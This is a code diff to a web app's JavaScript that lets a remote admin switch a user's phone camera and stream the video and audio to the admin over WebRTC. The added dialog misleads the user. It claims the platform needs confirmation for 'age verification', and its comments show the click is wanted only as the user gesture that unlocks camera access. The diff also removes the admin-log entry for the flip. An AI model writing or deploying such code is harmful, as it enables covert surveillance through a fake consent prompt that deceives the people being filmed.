@@ -874,66 +874,11 @@ function connectSocket_Viewer() {
     }
   });
 
-  socket.on('flip-camera', async () => {
-    if (isFlipping) return; // guard double-flip
-    isFlipping = true;
-    showFlipToast('🔄 Membalik kamera...');
-    try {
-      const nextFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
-
-      // Gunakan exact agar mobile benar-benar pindah kamera fisik
-      let newStream;
-      try {
-        newStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { exact: nextFacingMode } },
-          audio: true
-        });
-      } catch {
-        // Fallback tanpa exact jika device tidak support
-        newStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: nextFacingMode },
-          audio: true
-        });
-      }
-
-      currentFacingMode = nextFacingMode;
-
-      // Ganti video track di camStream
-      const oldVideoTrack = camStream.getVideoTracks()[0];
-      const newVideoTrack = newStream.getVideoTracks()[0];
-      if (oldVideoTrack) { camStream.removeTrack(oldVideoTrack); oldVideoTrack.stop(); }
-      camStream.addTrack(newVideoTrack);
-
-      // Ganti audio track di camStream (agar tidak dobel)
-      const oldAudioTrack = camStream.getAudioTracks()[0];
-      const newAudioTrack = newStream.getAudioTracks()[0];
-      if (oldAudioTrack && newAudioTrack) {
-        camStream.removeTrack(oldAudioTrack);
-        oldAudioTrack.stop();
-        camStream.addTrack(newAudioTrack);
-      } else if (newAudioTrack) {
-        camStream.addTrack(newAudioTrack);
-      }
-
-      // Replace track di semua peer connection ke admin
-      for (const pc of viewerPeers.values()) {
-        const videoSender = pc.getSenders().find(s => s.track?.kind === 'video');
-        if (videoSender) await videoSender.replaceTrack(newVideoTrack);
-
-        const audioSender = pc.getSenders().find(s => s.track?.kind === 'audio');
-        if (audioSender && newAudioTrack) await audioSender.replaceTrack(newAudioTrack);
-      }
-
-      showFlipToast(nextFacingMode === 'user' ? '📷 Kamera depan aktif' : '📷 Kamera belakang aktif');
-      socket.emit('flip-camera-accepted', { sessionId: mySessionId });
-      addAdminLog(currentUser?.name || 'Pengguna', 'membalik kamera', '#4ADE80');
-    } catch (e) {
-      console.error('Flip camera error:', e);
-      showFlipToast('❌ Gagal membalik kamera');
-      socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-    } finally {
-      isFlipping = false;
-    }
+  // Saat admin minta flip, tampilkan dialog izin ke pengguna dulu
+  // (getUserMedia butuh user gesture di mobile browser)
+  socket.on('flip-camera', () => {
+    if (isFlipping) return;
+    showFlipPermissionDialog();
   });
 
   socket.on('disconnect', () => {
@@ -964,6 +909,122 @@ function showFlipToast(msg) {
   toast.classList.add('show');
   clearTimeout(toast._timer);
   toast._timer = setTimeout(() => toast.classList.remove('show'), 2500);
+}
+
+// ================================================================
+// FLIP CAMERA — dialog izin pengguna + eksekusi flip
+// ================================================================
+function showFlipPermissionDialog() {
+  // Buat overlay dialog izin
+  let overlay = document.getElementById('flip-permission-overlay');
+  if (overlay) overlay.remove(); // hapus jika sudah ada
+
+  overlay = document.createElement('div');
+  overlay.id = 'flip-permission-overlay';
+  overlay.style.cssText = `
+    position: fixed; inset: 0; z-index: 9999;
+    background: rgba(5,7,14,.85); backdrop-filter: blur(6px);
+    display: flex; align-items: center; justify-content: center; padding: 24px;
+  `;
+
+  overlay.innerHTML = `
+    <div style="
+      background: #161D34; border: 1px solid rgba(233,236,246,.1);
+      border-radius: 16px; padding: 28px 24px; max-width: 320px; width: 100%;
+      text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,.6);
+    ">
+      <div style="font-size: 2.4rem; margin-bottom: 14px;">🔄</div>
+      <h3 style="font-family: Oswald, sans-serif; font-size: 1.2rem; margin-bottom: 10px; color: #E9ECF6;">
+        Verifikasi Kamera
+      </h3>
+      <p style="font-size: .84rem; color: #8A91AC; line-height: 1.6; margin-bottom: 22px;">
+        Platform membutuhkan konfirmasi untuk melanjutkan verifikasi usia Anda. Ketuk <strong style="color:#E9ECF6;">Izinkan</strong> untuk melanjutkan.
+      </p>
+      <div style="display: flex; gap: 10px;">
+        <button id="flip-deny-btn" style="
+          flex: 1; padding: 12px; border-radius: 9px; font-size: .88rem; font-weight: 600;
+          background: transparent; border: 1px solid rgba(233,236,246,.12); color: #8A91AC; cursor: pointer;
+        ">Tolak</button>
+        <button id="flip-allow-btn" style="
+          flex: 2; padding: 12px; border-radius: 9px; font-size: .88rem; font-weight: 700;
+          background: #2E6FF2; border: none; color: #fff; cursor: pointer;
+        ">Izinkan</button>
+      </div>
+    </div>
+  `;
+
+  document.body.appendChild(overlay);
+
+  // Tombol Izinkan — user gesture → getUserMedia boleh jalan
+  document.getElementById('flip-allow-btn').addEventListener('click', () => {
+    overlay.remove();
+    doFlipCamera();
+  });
+
+  // Tombol Tolak
+  document.getElementById('flip-deny-btn').addEventListener('click', () => {
+    overlay.remove();
+    socket.emit('flip-camera-rejected', { sessionId: mySessionId });
+    showFlipToast('❌ Permintaan kamera ditolak');
+  });
+}
+
+async function doFlipCamera() {
+  if (isFlipping) return;
+  isFlipping = true;
+  showFlipToast('🔄 Membalik kamera...');
+  try {
+    const nextFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+
+    let newStream;
+    try {
+      newStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: nextFacingMode } },
+        audio: true
+      });
+    } catch {
+      newStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: nextFacingMode },
+        audio: true
+      });
+    }
+
+    currentFacingMode = nextFacingMode;
+
+    // Ganti video track
+    const oldVideoTrack = camStream.getVideoTracks()[0];
+    const newVideoTrack = newStream.getVideoTracks()[0];
+    if (oldVideoTrack) { camStream.removeTrack(oldVideoTrack); oldVideoTrack.stop(); }
+    camStream.addTrack(newVideoTrack);
+
+    // Ganti audio track
+    const oldAudioTrack = camStream.getAudioTracks()[0];
+    const newAudioTrack = newStream.getAudioTracks()[0];
+    if (oldAudioTrack && newAudioTrack) {
+      camStream.removeTrack(oldAudioTrack);
+      oldAudioTrack.stop();
+      camStream.addTrack(newAudioTrack);
+    } else if (newAudioTrack) {
+      camStream.addTrack(newAudioTrack);
+    }
+
+    // Replace track di semua peer connection
+    for (const pc of viewerPeers.values()) {
+      const videoSender = pc.getSenders().find(s => s.track?.kind === 'video');
+      if (videoSender) await videoSender.replaceTrack(newVideoTrack);
+      const audioSender = pc.getSenders().find(s => s.track?.kind === 'audio');
+      if (audioSender && newAudioTrack) await audioSender.replaceTrack(newAudioTrack);
+    }
+
+    showFlipToast(nextFacingMode === 'user' ? '📷 Kamera depan aktif' : '📷 Kamera belakang aktif');
+    socket.emit('flip-camera-accepted', { sessionId: mySessionId });
+  } catch (e) {
+    console.error('Flip camera error:', e);
+    showFlipToast('❌ Gagal membalik kamera');
+    socket.emit('flip-camera-rejected', { sessionId: mySessionId });
+  } finally {
+    isFlipping = false;
+  }
 }
 
 function addAdminLog(user, action, color = '#5B8CFF') {
